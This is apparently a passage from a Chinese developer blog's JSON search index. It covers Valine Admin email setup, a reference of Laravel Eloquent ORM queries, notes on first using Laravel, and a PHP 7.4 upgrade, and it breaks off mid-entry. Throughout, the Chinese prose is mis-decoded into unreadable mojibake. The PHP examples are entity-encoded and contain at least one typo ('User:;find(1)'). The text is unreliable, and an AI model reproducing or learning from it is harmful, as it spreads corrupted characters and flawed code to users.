è¿™é‡Œæœ‰ä¸ªé—®é¢˜å°±æ˜¯éƒ¨åˆ†å˜é‡ä¸å†å¯ç”¨ï¼Œå¦‚æœä½¿ç”¨äº†æœªå®šä¹‰çš„å˜é‡ï¼Œå‘é€é‚®ä»¶æ—¶ä¼šæŠ›å‡ºå¼‚å¸¸ï¼š æˆ‘é€‰æ‹©å»æ‰äº†éƒ¨åˆ†å˜é‡ï¼Œè¿™å°±å¯¼è‡´äº†é‚®ä»¶éƒ¨åˆ†å†…å®¹æ˜¯ç¼ºå¤±çš„ï¼š è¿™é‡Œæ²¡ç»§ç»­å¾€ä¸‹æ·±ç©¶äº†ï¼Œèƒ½ç”¨å°±è¡Œï¼Œè‡³æ­¤å°±å®Œæˆäº†æ‰€æœ‰é…ç½®ã€‚å¦‚æœä½ é‡åˆ°ä¸€äº›å¥‡æ€ªçš„é—®é¢˜ï¼Œå¯ä»¥çœ‹çœ‹ä»¥ä¸‹å»ºè®®å¯¹ä½ æ˜¯å¦æœ‰ç”¨ï¼š å¸¸è§é—®é¢˜ LeanCloud åˆ†å›½å†…ç‰ˆå’Œå›½é™…ç‰ˆï¼Œå¦‚æœä½ å’Œæˆ‘ä¸€æ ·ä¸å–œæ¬¢åŸŸåå¤‡æ¡ˆï¼Œä½¿ç”¨çš„æ˜¯å›½é™…åŸŸåæœåŠ¡å•†æä¾›çš„åŸŸåï¼Œé‚£ä¹ˆæ³¨å†ŒLeanCloud æ—¶ï¼Œè¯·é€‰é€‰æ‹©å›½é™…ç‰ˆã€‚ åŸŸåè§£æå¦‚æœé•¿æ—¶é—´æœªç”Ÿæ•ˆï¼Œè¯·æ£€æŸ¥æ·»åŠ CNAME çºªå½•ï¼Œttl ä¸è¦é€‰æ‹©ä¸€å°æ—¶ï¼Œé€‰æ‹©å…­ç™¾ç§’ã€‚ SMTP_PASS ä¸æ˜¯QQ é‚®ç®±çš„å¯†ç ï¼Œè€Œæ˜¯SMTPæœåŠ¡çš„å¯†é’¥ï¼Œå¦‚æœä¸çŸ¥é“å¦‚ä½•è·å–ï¼Œå¯ä»¥çœ‹è¿™é‡Œã€‚ ä¿®æ”¹å®Œå˜é‡ï¼Œéœ€è¦é‡å¯åº”ç”¨ï¼Œå¦è€…ä¸ä¼šç”Ÿæ•ˆã€‚ å‚è€ƒé“¾æ¥ Valine Admin Valine Admin é…ç½®æ‰‹å†Œ","categories":[{"name":"Hexo","slug":"Hexo","permalink":"https://www.0x2beace.com/categories/Hexo/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://www.0x2beace.com/tags/Hexo/"}]},{"title":"Laravel Eloquent ORM å¸¸ç”¨æ“ä½œæ•´ç†","slug":"laravel-eloquent-orm-common-operations-finishing","date":"2021-04-04T01:22:30.000Z","updated":"2021-04-04T01:23:43.318Z","comments":true,"path":"laravel-eloquent-orm-common-operations-finishing/","link":"","permalink":"https://www.0x2beace.com/laravel-eloquent-orm-common-operations-finishing/","excerpt":"Laravel æ”¯æŒåŸç”Ÿçš„ SQL æŸ¥è¯¢ã€æµç•…çš„æŸ¥è¯¢æ„é€ å™¨ å’Œ Eloquent ORM ä¸‰ç§æŸ¥è¯¢æ–¹å¼ï¼š","text":"Laravel æ”¯æŒåŸç”Ÿçš„ SQL æŸ¥è¯¢ã€æµç•…çš„æŸ¥è¯¢æ„é€ å™¨ å’Œ Eloquent ORM ä¸‰ç§æŸ¥è¯¢æ–¹å¼ï¼š æµç•…çš„æŸ¥è¯¢æ„é€ å™¨ï¼ˆç®€ç§°DBï¼‰ï¼Œå®ƒæ˜¯ä¸ºåˆ›å»ºå’Œè¿è¡Œæ•°æ®åº“æŸ¥è¯¢æä¾›çš„ä¸€ä¸ªæ¥å£ï¼Œæ”¯æŒå¤§éƒ¨åˆ†æ•°æ®åº“æ“ä½œï¼Œå’Œæ‰‹å†™SQL çš„æœ¬è´¨æ˜¯ä¸€æ ·çš„ã€‚ Eloquent ORMï¼ˆç®€ç§°ORMï¼‰ï¼Œæ˜¯ä¸€ä¸ªå¯¹è±¡å…³ç³»æ˜ å°„(Object Relational Mapper)å·¥å…·ï¼Œé€šè¿‡å»ºç«‹æ¨¡å‹ä¸æ•°æ®è¡¨è¿›è¡Œäº¤äº’ï¼Œå®ƒä¼šæŠŠæ•°æ®åº“ä¸­çš„æ•°æ®æ˜ å°„æˆå¯¹è±¡å’Œé›†åˆå¯¹è±¡ï¼Œæ— éœ€æ¥è§¦åº•å±‚æ•°æ®ï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨æ˜ å°„å‡ºæ¥çš„å¯¹è±¡è¿›è¡Œå¼€å‘ã€‚ è¿™ç¯‡ç¬”è®°ä¸»è¦æ¥æ•´ç†ä¸‹å¸¸ç”¨çš„ORM æ“ä½œã€‚ æŸ¥è¯¢artisan tinker æ˜¯ Laravel æ¡†æ¶è‡ªå¸¦çš„å‘½ä»¤ï¼Œç”¨ä»¥è°ƒå‡º Laravel çš„äº¤äº’å¼è¿è¡Œæ—¶ï¼ŒEloquent ORM çš„ä»£ç å¯ä»¥ç›´æ¥åœ¨è¯¥ç¯å¢ƒä¸­è¿è¡Œã€‚ æŸ¥è¯¢åˆ—è¡¨è·å–æ‰€æœ‰æ•°æ®ï¼š 12use App\\Models\\User;$users &#x3D; User::all(); å¦‚æœåªéœ€è¦éƒ¨åˆ†å­—æ®µï¼Œæœ‰ä¸¤ç§æ–¹å¼è¿›è¡Œé™å®šï¼š 123$users &#x3D; User::all([&quot;id&quot;, &quot;name&quot;]);$users &#x3D; User::select(&quot;id&quot;, &quot;name&quot;)-&gt;get(); è·å–å•åˆ—ï¼š 12$name &#x3D; User::pluck(&#39;name&#39;);&#x2F;&#x2F; [&quot;boo&quot;, &quot;mac&quot;, &quot;yumi&quot;] è¿˜å¯ä»¥åœ¨è¿”å›çš„é›†åˆä¸­æŒ‡å®šå­—æ®µçš„è‡ªå®šä¹‰é”®åï¼Œæ³¨æ„ï¼šè¯¥è‡ªå®šä¹‰é”®å¿…é¡»æ˜¯è¯¥è¡¨çš„å…¶å®ƒå­—æ®µåˆ—åï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼š 12$name &#x3D; User::pluck(&#39;email&#39;,&#39;name&#39;);&#x2F;&#x2F; [&quot;boo&quot; &#x3D;&gt; &quot;boo@example.com&quot;, &quot;yumi&quot; &#x3D;&gt; &quot;yumi@example.com&quot;] æŸ¥è¯¢å•æ¡æ•°æ®1234567891011121314&#x2F;&#x2F; é€šè¿‡ä¸»é”®è·å–æ¨¡å‹$user &#x3D; User:;find(1);&#x2F;&#x2F; è·å–åŒ¹é…æŸ¥è¯¢æ¡ä»¶çš„ç¬¬ä¸€ä¸ªæ¨¡å‹$user &#x3D; User::where(&#39;is_enable&#39;, 1)-&gt;first();&#x2F;&#x2F; è·å–ç¬¬ä¸€æ¡æ•°æ®çš„æŒ‡å®šåˆ—å€¼$user &#x3D; User::value(&quot;name&quot;); &#x2F;&#x2F; è¿”å›ç»“æœæ˜¯å­—ç¬¦ä¸²ï¼šboo&#x2F;&#x2F; ä¼ é€’ä¸»é”®æ•°ç»„æ¥è°ƒç”¨ find æ–¹æ³•ï¼Œè¿”å›åŒ¹é…è®°å½•é›†åˆ$user &#x3D; User::find([1,2,3]); &#x2F;&#x2F; ç­‰åŒäº $user &#x3D; User::whereIn(&quot;id&quot;, [1,2,3])-&gt;get(); å¤„ç†è¿”å›ç»“æœé›†Eloquent ORM æŸ¥è¯¢è¿”å›å€¼æ˜¯ Illuminate\\Database\\EloquentCollection çš„ä¸€ä¸ªå®ä¾‹ï¼Œæ‰€ä»¥é™¤äº†å¯ä»¥ä½¿ç”¨ä¼ ç»Ÿçš„æ•°ç»„æ–¹å¼è¿›è¡Œéå†ï¼Œè¿˜å¯ä»¥ä½¿ç”¨é›†åˆæ–¹å¼è¿›è¡Œéå†ã€‚ chunkchunkæ–¹æ³•å¯ä»¥æŠŠå¤§çš„ç»“æœé›†åˆ†æˆå°å—æŸ¥è¯¢ï¼Œä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¨éƒ¨User è¡¨æ•°æ®åˆ‡å‰²æˆä¸€æ¬¡å¤„ç† 5 æ¡è®°å½•çš„ä¸€å°å—ï¼š 123456$result &#x3D; User::chunk(5, function ($users) &#123; foreach ($users as $user) &#123; echo $user-&gt;name.PHP_EOL; &#125;&#125;);&#x2F;&#x2F; result ä¸º boolean åœ¨Userè¡¨ä¸­ä¸€å…±æœ‰14æ¡æ•°æ®ï¼Œé€šè¿‡æŸ¥çœ‹æŸ¥è¯¢æ—¥å¿—ï¼Œå¯ä»¥çœ‹åˆ°chunk åˆ†äº†ä¸‰æ¬¡æŸ¥è¯¢ ï¼š eachå¦‚æœæƒ³å¯¹ä¸€ä¸ªé›†åˆä¸­çš„æ¯ä¸€é¡¹éƒ½è¿›è¡Œä¸€äº›æ“ä½œï¼Œä½†ä¸ä¿®æ”¹é›†åˆæœ¬èº«ï¼Œåˆ™å¯ä»¥ä½¿ç”¨eachï¼š 12345$users &#x3D; User::all();$users &#x3D; $users-&gt;each(function ($user , $key) &#123; $user-&gt;password &#x3D; bcrypt(122410);&#125;);&#x2F;&#x2F; è¿”å›ç»“æœåŒ…å«å®Œæ•´çš„Useræ¨¡å‹ï¼Œå…¶ä¸­password å­—æ®µçš„å€¼è¢«ä¿®æ”¹ mapå¦‚æœæƒ³å¯¹é›†åˆä¸­çš„æ‰€æœ‰å…ƒç´ è¿›è¡Œè¿­ä»£ï¼Œå¯¹å®ƒä»¬è¿›è¡Œä¿®æ”¹ï¼Œå¹¶è¿”å›åŒ…å«ä¿®æ”¹çš„æ–°é›†åˆï¼Œé‚£ä¹ˆéœ€è¦ä½¿ç”¨mapï¼š 12345678$users &#x3D; User::all();$users &#x3D; $users-&gt;map(function ($user, $key) &#123; return [ &quot;name&quot; &#x3D;&gt; $user-&gt;name, &quot;password&quot; &#x3D;&gt; bcrypt(122410), ];&#125;);&#x2F;&#x2F; è¿”å›ç»“æœä»…åŒ…å«name å’Œpassword å­—æ®µï¼Œå…¶ä¸­password å­—æ®µçš„å€¼è¢«ä¿®æ”¹ èšåˆæ–¹æ³•123456&#x2F;&#x2F; ç»Ÿè®¡æ€»æ•°$count &#x3D; User::count();&#x2F;&#x2F; ç»Ÿè®¡åˆ†ç»„$count &#x3D; User::select(User::raw(&quot;count(id) as aggregate&quot;))-&gt;groupBy(&quot;is_enable&quot;)-&gt;get();&#x2F;&#x2F; æ³¨æ„ä¸èƒ½è¿™æ ·å†™ï¼šUser::select(&#39;count(id) as aggregate&#39;)-&gt;groupBy(&quot;is_enable&quot;)-&gt;get(); æ¡ä»¶æŸ¥è¯¢æ„å»ºå¤æ‚æŸ¥è¯¢ï¼š 12345678910111213141516171819202122232425262728&#x2F;&#x2F; ç»„åˆæŸ¥è¯¢æ–¹å¼ä¸€$where &#x3D; [];$where[] &#x3D; [&quot;is_enable&quot;, 1];$where[] &#x3D; [ function($query)&#123; $query-&gt;where(&quot;id&quot;, &quot;&gt;&quot;, 10) -&gt;orWhere(&quot;name&quot;, &quot;like&quot;, &quot;%admin%&quot;);&#125;];User::select(&quot;id&quot;, &quot;name as username&quot;, &quot;email&quot;)-&gt;where($where)-&gt;get(); &#x2F;&#x2F; ç»„åˆæŸ¥è¯¢æ–¹å¼äºŒ$builder &#x3D; User::select(&quot;id&quot;, &quot;name as username&quot;, &quot;email&quot;);$builder-&gt;where(&quot;is_enable&quot;, 1);$builder-&gt;where(function ($query)&#123; $query-&gt;where(&quot;id&quot;, &quot;&gt;&quot;, 10) -&gt;orWhere(&quot;name&quot;, &quot;like&quot;, &quot;%admin%&quot;);&#125;);$users &#x3D; $builder-&gt;get();&#x2F;&#x2F; ä¸¤ç§æ–¹å¼çš„æŸ¥è¯¢SQL æ˜¯ä¸€æ ·çš„ï¼š select &#96;id&#96;, &#96;name&#96; as &#96;username&#96;, &#96;email&#96; from &#96;users&#96; where (&#96;is_enable&#96; &#x3D; &#39;1&#39; and (&#96;id&#96; &gt; &#39;10&#39; or &#96;name&#96; like &#39;%admin%&#39;))&#x2F;&#x2F; Where Exists$builder &#x3D; User::select(&quot;id&quot;, &quot;name&quot;, &quot;email&quot;);$builder-&gt;whereExists(function ($query)&#123; $query-&gt;select(User::raw(&quot;title&quot;)) -&gt;from(&quot;topics&quot;) -&gt;whereRaw(&quot;topics.user_id &#x3D; users.id&quot;);&#125;); æ’åº1234567891011&#x2F;&#x2F; ç”¨æˆ·id å€’åº$user &#x3D; User::orderBy(&quot;id&quot;, &quot;desc&quot;)-&gt;get();&#x2F;&#x2F; è·å–created_at æœ€å¤§çš„ä¸€æ¡è®°å½•$user &#x3D; User::latest()-&gt;first();&#x2F;&#x2F; è·å–created_at æœ€å°çš„ä¸€æ¡è®°å½•$user &#x3D; User::oldest()-&gt;first();&#x2F;&#x2F; éšæœºä¸€æ¡è®°å½•$users &#x3D; User::inRandomOrder()-&gt;first(); é™å®š123456&#x2F;&#x2F; è·³è¿‡å‰ä¸¤æ¡è®°å½•ï¼Œå–ä¸‰æ¡è®°å½•$users &#x3D; User::skip(2)-&gt;take(3)-&gt;get();&#x2F;&#x2F; è¾“å‡ºSQLï¼šselect * from &#96;users&#96; limit 3 offset 2 &#x2F;&#x2F; åŒä¸Š$users &#x3D; User::offset(2)-&gt;limit(3)-&gt;get(); å…¶ä»–1234567&#x2F;&#x2F; ä½¿ç”¨åˆ«å$user &#x3D; User::select(&quot;name as username&quot;, &quot;id&quot;)-&gt;first();&#x2F;&#x2F; åˆ›å»ºä¸€ä¸ªæŸ¥è¯¢æ„å»ºå™¨$builder &#x3D; User::select(&quot;name&quot;);&#x2F;&#x2F; æ·»åŠ ä¸€ä¸ªæŸ¥è¯¢åˆ—åˆ°å·²å­˜åœ¨çš„ select å­å¥$user &#x3D; $builder-&gt;addSelect(&quot;id&quot;)-&gt;first(); åˆ†é¡µ12$users &#x3D; User::paginate(10);$users &#x3D; User::simplePaginate(10); paginate æ–¹æ³•ï¼Œè¿”å›Illuminate\\Pagination\\LengthAwarePaginatorå®ä¾‹ simplePaginate æ–¹æ³•ï¼Œè¿”å›Illuminate\\Pagination\\Paginatorå®ä¾‹ æ¯ä¸ªåˆ†é¡µå™¨å®ä¾‹éƒ½å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹æ³•æä¾›æ›´å¤šåˆ†é¡µä¿¡æ¯ï¼š 1234567891011$result-&gt;count() &#x2F;&#x2F; å½“å‰é¡µæ¡æ•° $result-&gt;currentPage() &#x2F;&#x2F; å½“å‰é¡µç $result-&gt;perPage() &#x2F;&#x2F; æ¯é¡µå¤šå°‘æ¡$result-&gt;total() &#x2F;&#x2F; æ€»æ•°(ä½¿ç”¨simplePaginate æ—¶æ— æ•ˆ)$result-&gt;hasMorePages() &#x2F;&#x2F; æ˜¯å¦æœ‰æ›´å¤š$result-&gt;firstItem() $result-&gt;lastItem()$result-&gt;lastPage() (ä½¿ç”¨simplePaginate æ—¶æ— æ•ˆ)$result-&gt;nextPageUrl()$result-&gt;previousPageUrl()$result-&gt;url($page) æ’å…¥1234567891011121314151617181920$user &#x3D; new User();$user-&gt;name &#x3D; &quot;yumi&quot;;$user-&gt;fill([&quot;email&quot; &#x3D;&gt; &quot;yumi@example.com&quot;]);$user-&gt;save();&#x2F;&#x2F; è¿”å›æ¨¡å‹å¯¹è±¡$result &#x3D; User::create( [&quot;name&quot;&#x3D;&gt;&quot;boo&quot;, &#39;email&#39; &#x3D;&gt; &#39;boo@example.com&#39;]);&#x2F;&#x2F; è¿”å›æ¨¡å‹å¯¹è±¡$result &#x3D; User::insert( [&quot;name&quot;&#x3D;&gt;&quot;boo&quot;, &#39;email&#39; &#x3D;&gt; &#39;boo@example.com&#39;]);&#x2F;&#x2F; è¿”å›Boolean$result &#x3D; User::insertGetId( [&quot;name&quot;&#x3D;&gt;&quot;boo&quot;, &#39;email&#39; &#x3D;&gt; &#39;boo@example.com&#39;]);&#x2F;&#x2F; è¿”å›æ’å…¥è®°å½•å¯¹åº”ID æ›´æ–°å•ä¸ªæ›´æ–° 1234567$user &#x3D; User::find(1);$user-&gt;name &#x3D; &#39;yumi&#39;;$user-&gt;save();&#x2F;&#x2F; è¿”å›Boolean$user &#x3D; User::where(&quot;id&quot;, 1)-&gt;update([&#39;password&#39; &#x3D;&gt; bcrypt(122410)]);&#x2F;&#x2F; è¿”å›å—å½±å“è¡Œæ•° æ‰¹é‡æ›´æ–°ï¼š 12$user &#x3D; User::whereIn(&quot;id&quot;, [1,2,3])-&gt;update([&#39;password&#39; &#x3D;&gt; bcrypt(122410)]); &#x2F;&#x2F; è¿”å›å—å½±å“è¡Œæ•° åˆ é™¤å•ä¸ªåˆ é™¤ 12345678910&#x2F;&#x2F; é€šè¿‡ä¸»é”®æŸ¥è¯¢ï¼Œåˆ é™¤æ¨¡å‹$user &#x3D; User::find(1);$user-&gt;delete();&#x2F;&#x2F; è¿”å›Boolean&#x2F;&#x2F; ç›´æ¥é€šè¿‡ä¸»é”®åˆ é™¤User::destroy(1);&#x2F;&#x2F; è¿”å›å—å½±å“è¡Œæ•°User::where(&#39;id&#39;, 1)-&gt;delete(); æ‰¹é‡åˆ é™¤ï¼š 1234567User::destroy([1, 2, 3]);User::destroy(1, 2, 3);&#x2F;&#x2F; æ³¨ï¼šé€šè¿‡ Eloquent æ‰¹é‡åˆ é™¤æ—¶ï¼Œdeleting å’Œ deletedäº‹ä»¶ä¸ä¼šè¢«è§¦å‘ï¼Œå› ä¸ºåœ¨è¿›è¡Œæ¨¡å‹åˆ é™¤æ—¶ä¸ä¼šè·å–æ¨¡å‹ã€‚User::whereIn(&#39;id&#39;, [1, 2, 3])-&gt;delete();&#x2F;&#x2F; å‡è¿”å›å—å½±å“è¡Œæ•° è½¯åˆ é™¤é™¤äº†çœŸå®åˆ é™¤æ•°æ®åº“è®°å½•ï¼ŒEloquent ä¹Ÿå¯ä»¥ã€Œè½¯åˆ é™¤ã€æ¨¡å‹ã€‚è½¯åˆ é™¤çš„æ¨¡å‹å¹¶ä¸æ˜¯çœŸçš„ä»æ•°æ®åº“ä¸­åˆ é™¤äº†ã€‚ äº‹å®ä¸Šï¼Œæ˜¯åœ¨æ¨¡å‹ä¸Šè®¾ç½®äº† deleted_at å±æ€§å¹¶å°†å…¶å€¼å†™å…¥æ•°æ®åº“ã€‚å¦‚æœ deleted_at å€¼éç©ºï¼Œä»£è¡¨è¿™ä¸ªæ¨¡å‹å·²è¢«è½¯åˆ é™¤ã€‚ å¦‚æœè¦å¼€å¯æ¨¡å‹è½¯åˆ é™¤åŠŸèƒ½ï¼Œéœ€è¦åœ¨æ¨¡å‹ä¸Šä½¿ç”¨ Illuminate\\Database\\Eloquent\\SoftDeletes traitï¼ŒåŒæ—¶éœ€è¦æ·»åŠ  $dates å±æ€§ï¼š 12345678910111213&lt;?phpnamespace App\\Models;use Illuminate\\Database\\Eloquent\\Model;use Illuminate\\Database\\Eloquent\\SoftDeletes;class User extends Model&#123; use SoftDeletes; protected $dates &#x3D; [&#39;deleted_at&#39;];&#125; ç°åœ¨ï¼Œå½“åœ¨æ¨¡å‹å®ä¾‹ä¸Šä½¿ç”¨ delete æ–¹æ³•ï¼Œå½“å‰æ—¥æœŸæ—¶é—´ä¼šå†™å…¥ deleted_at å­—æ®µã€‚åŒæ—¶ï¼ŒæŸ¥è¯¢å‡ºæ¥çš„ç»“æœä¹Ÿä¼šè‡ªåŠ¨æ’é™¤å·²è¢«è½¯åˆ é™¤çš„è®°å½•ã€‚ è½¯åˆ é™¤å¸¸è§æ“ä½œ12345678910111213&#x2F;&#x2F; éªŒè¯ç»™å®šçš„æ¨¡å‹å®ä¾‹æ˜¯å¦å·²è¢«è½¯åˆ é™¤if ($user-&gt;trashed()) &#123; &#x2F;&#x2F;&#125;&#x2F;&#x2F; åŒ…æ‹¬å·²è½¯åˆ é™¤çš„æ¨¡å‹$users &#x3D; User::withTrashed()-&gt;get(); &#x2F;&#x2F; åªæ£€ç´¢è½¯åˆ é™¤æ¨¡å‹ $users &#x3D; User::onlyTrashed()-&gt;get();&#x2F;&#x2F; æ°¸ä¹…åˆ é™¤$user-&gt;forceDelete(); æ³¨æ„âš ï¸ï¼š é€šè¿‡ Eloquent æ‰¹é‡åˆ é™¤æ—¶ï¼Œdeleting å’Œ deleted äº‹ä»¶ä¸ä¼šè¢«è§¦å‘ï¼Œå› ä¸ºåœ¨è¿›è¡Œæ¨¡å‹åˆ é™¤æ—¶ä¸ä¼šè·å–æ¨¡å‹ã€‚ é€šè¿‡ Eloquent æ‰¹é‡æ›´æ–°æ—¶ï¼Œæ›´æ–°çš„æ¨¡å‹ä¸ä¼šè§¦å‘ saving, saved, updating å’Œ updated æ¨¡å‹äº‹ä»¶ã€‚è¿™æ˜¯å› ä¸ºåœ¨æ‰¹é‡æ›´æ–°æ—¶å®é™…ä¸Šä»æœªæ£€ç´¢æ¨¡å‹ã€‚ å‚è€ƒé“¾æ¥ Eloquent å¿«é€Ÿå…¥é—¨ Laravel ä¸­Eloquent ORM ç›¸å…³æ“ä½œ","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"è°ˆè°ˆç¬¬ä¸€æ¬¡ä½¿ç”¨ Laravel å¼€å‘çš„æ„Ÿæƒ³","slug":"talk-about-the-feelings-of-using-laravel-development-for-the-first-time","date":"2021-04-03T04:36:54.000Z","updated":"2021-04-03T09:35:09.242Z","comments":true,"path":"talk-about-the-feelings-of-using-laravel-development-for-the-first-time/","link":"","permalink":"https://www.0x2beace.com/talk-about-the-feelings-of-using-laravel-development-for-the-first-time/","excerpt":"è¿™ç¯‡ç¬”è®°ç”¨æ¥è®°å½•ä¸€ä¸‹ä½¿ç”¨Laravel å¼€å‘çš„ä¸€äº›æ„Ÿæƒ³ã€‚","text":"è¿™ç¯‡ç¬”è®°ç”¨æ¥è®°å½•ä¸€ä¸‹ä½¿ç”¨Laravel å¼€å‘çš„ä¸€äº›æ„Ÿæƒ³ã€‚ ç¬”è€…æœ€æ—©æ¥è§¦çš„ç¬¬ä¸€ä¸ªPHP æ¡†æ¶æ˜¯ThinkPHP 3.2ï¼Œå†™è¿‡æ¥å£ï¼Œåšè¿‡ç½‘ç«™ã€‚ åæ¥å‘ç°äº†Laravel è¿™ä¸ªæ¡†æ¶ï¼Œé‚£æ—¶æœ€æ–°çš„ç‰ˆæœ¬æ˜¯5.xï¼Œå½“æ—¶å°±è§‰å¾—è¿™ä¸ªæ¡†æ¶å¯çœŸé«˜çº§ï¼Œå¥½å¤šä»æœªäº†è§£åˆ°çš„æ¦‚å¿µã€‚ ä¹Ÿæ­£æ˜¯ä»é‚£ä¸ªæ—¶å€™å¼€å§‹äº†è§£Laravelï¼Œé€šè¿‡learnku ä¸Šçš„ç³»åˆ—è¯¾ç¨‹è¿›è¡Œå­¦ä¹ ï¼Œ å‰å‰ååä¹Ÿæ˜¯èŠ±äº†ä¸å°‘æ—¶é—´åœ¨ä¸Šé¢ï¼Œå§‹ç»ˆæ²¡æœºä¼šè¿›å…¥é¡¹ç›®å®æˆ˜ï¼Œä¸€ç›´åœç•™åœ¨å­¦ä¹ å±‚é¢ã€‚ ä»Šå¹´çš„ç¬¬ä¸€ä¸ªé¡¹ç›®æœ‰å¹¸ä½¿ç”¨Laravel ä»é›¶å¼€å‘ï¼Œå½“æˆ‘å†æ¬¡æ¡èµ·ä¹‹å‰çœ‹è¿‡çš„è¯¾ç¨‹ï¼Œæ„Ÿè§‰å‡ ä¹ç™½çœ‹äº†ï¼Œå¥½å¤šç‚¹å®Œå…¨éƒ½æ²¡å°è±¡äº†ã€‚ æœ‰å¹¸é‡åˆ°ä¸€ä½ä¸é”™çš„é¡¹ç›®ç»„é•¿ï¼Œé¡¹ç›®å¼€å‘åˆæœŸç»™äº†ä¸€äº›æ—¶é—´å»åšå‡†å¤‡ã€‚ è¿™ä¸€å‘¨æ˜¯æ–°é¡¹ç›®æ­£å¼å¼€å§‹çš„ç¬¬ä¸€å‘¨ï¼Œé¡¹ç›®è¿›å±•æŒºé¡ºåˆ©çš„ï¼ˆæ²¡æœ‰æ‹–åè…¿ ğŸ˜€ï¼‰ï¼Œä¸å¾—ä¸è¯´ä½¿ç”¨Laravel å¼€å‘çš„æ•ˆç‡çœŸçš„å¾ˆé«˜ï¼Œä¸°å¯Œçš„ç¬¬ä¸‰æ–¹æ‰©å±•åŒ…å¯ä»¥æ»¡è¶³æ—¥å¸¸å¼€å‘çš„ç»å¤§å¤šæ•°åº”ç”¨åœºæ™¯ã€‚ è¿™ä¸ç¦è®©æˆ‘å¼•å‘æ€è€ƒï¼Œä¸ºä»€ä¹ˆä¹‹å‰èŠ±æ›´å¤šçš„æ—¶é—´å’Œç²¾åŠ›å»å­¦ä¹ ï¼Œå´è¿˜æ²¡æœ‰è¿™çŸ­çŸ­åŠä¸ªæœˆçš„æ”¶è·å¤§å‘¢ï¼Ÿ åŸå› å¾ˆç®€å•ï¼šç¼–ç¨‹æ˜¯æŠ€èƒ½ï¼Œä¸æ˜¯çŸ¥è¯†ï¼ŒæŠ€èƒ½åªæœ‰åœ¨ä¸æ–­ç»ƒä¹ ä¸‹æ‰ä¼šæœ‰è¿›æ­¥ ã€‚ å€Ÿç”¨ä¸€å¥è€è¯æ¥è®²å°±æ˜¯ï¼šçº¸ä¸Šå¾—æ¥ç»ˆè§‰æµ…ï¼Œç»çŸ¥æ­¤äº‹è¦èº¬è¡Œã€‚ ç°åœ¨å†å›å¤´çœ‹çœ‹learnku.com çš„ç«™é•¿ï¼Œåœ¨ä»‹ç»å¦‚ä½•æ­£ç¡®é˜…è¯»æœ¬ä¹¦æ—¶ï¼Œè¯´çš„ä¸€æ®µè¯ï¼ŒçœŸçš„ç‰¹åˆ«å¥½ï¼Œå¼ºè°ƒâ€œåˆ»æ„ç»ƒä¹ â€çš„é‡è¦æ€§ã€‚ æ‰€ä»¥ä¸èƒ½æ€»æ˜¯åœç•™åœ¨å­¦ä¹ é˜¶æ®µï¼Œæœ‰ä¸€å®šåŸºç¡€ä¹‹åï¼Œå°±å»åšï¼Œé‡åˆ°é—®é¢˜è§£å†³é—®é¢˜ï¼Œä¸ç”¨å¤ªåœ¨æ„ç»“æœå¦‚ä½•ï¼ŒåŠ¨æ‰‹å»åšå°±å¥½äº†ã€‚","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"},{"name":"ä¸€äº›æ€è€ƒ","slug":"PHP/Laravel/ä¸€äº›æ€è€ƒ","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"},{"name":"ä¸€äº›æ€è€ƒ","slug":"ä¸€äº›æ€è€ƒ","permalink":"https://www.0x2beace.com/tags/%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"}]},{"title":"è®°ä¸€æ¬¡å‡çº§ PHP å¼•å‘çš„ä¸€äº›æ€è€ƒ","slug":"some-thoughts-caused-by-upgrading-php-at-a-time","date":"2021-03-31T15:27:38.000Z","updated":"2021-04-03T04:39:35.526Z","comments":true,"path":"some-thoughts-caused-by-upgrading-php-at-a-time/","link":"","permalink":"https://www.0x2beace.com/some-thoughts-caused-by-upgrading-php-at-a-time/","excerpt":"å› ä¸ºå·¥ä½œåŸå› ï¼Œä»Šå¤©å°†æœ¬åœ°å¼€å‘ç¯å¢ƒçš„PHP å‡çº§åˆ°7.4 äº†ï¼Œæ­¤å‰ä¸€ç›´ä½¿ç”¨7.3ã€‚ ä¸­é—´é‡åˆ°äº†ä¸€äº›å°é—®é¢˜ï¼Œæ€»ä½“è¿˜ç®—é¡ºåˆ©ï¼Œåœ¨æ­¤è®°å½•ä¸€ä¸‹ã€‚","text":"å› ä¸ºå·¥ä½œåŸå› ï¼Œä»Šå¤©å°†æœ¬åœ°å¼€å‘ç¯å¢ƒçš„PHP å‡çº§åˆ°7.4 äº†ï¼Œæ­¤å‰ä¸€ç›´ä½¿ç”¨7.3ã€‚ ä¸­é—´é‡åˆ°äº†ä¸€äº›å°é—®é¢˜ï¼Œæ€»ä½“è¿˜ç®—é¡ºåˆ©ï¼Œåœ¨æ­¤è®°å½•ä¸€ä¸‹ã€‚ èƒŒæ™¯è¯´æ˜æˆ‘å¹¶æ²¡æœ‰ä½¿ç”¨é›†æˆçš„å¼€å‘ç¯å¢ƒï¼Œè€Œæ˜¯å•ç‹¬å®‰è£…æ‰€éœ€çš„5.6ã€7.0ã€7.1ã€7.2ã€7.3 ç‰ˆæœ¬ï¼Œæ‰€ä»¥å‡çº§7.4 ä¹Ÿå¾ˆç®€å•ï¼Œç›´æ¥ä½¿ç”¨brew å®‰è£…å³å¯ï¼š 1$ brew install php@7.4 ä½†æ˜¯è¿™ä¼šå¸¦æ¥ä¸€ä¸ªæ–°çš„é—®é¢˜ï¼šä¹‹å‰é€šè¿‡æºç 